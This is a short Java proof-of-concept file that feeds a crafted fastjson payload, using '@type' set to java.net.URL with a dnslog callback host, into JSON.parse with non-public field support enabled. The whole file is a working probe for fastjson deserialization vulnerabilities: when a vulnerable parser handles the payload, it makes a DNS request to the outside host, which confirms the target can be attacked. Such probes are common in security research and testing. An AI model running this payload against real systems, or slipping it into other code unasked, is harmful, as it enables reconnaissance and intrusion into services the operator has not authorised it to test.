package org.example.no1;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class POC2 {

    public static void main(String[] args) {
        String payload = "{\n" +
                "    {\"@type\":\"java.net.URL\",\n" +
                "    \"val\":\"http://fd76c55b.log.dnslog.myfw.us\"}: \"x\"}";
        System.out.println(payload);
        Object parse = JSON.parse(payload, Feature.SupportNonPublicField);
        System.out.println();
    }
}
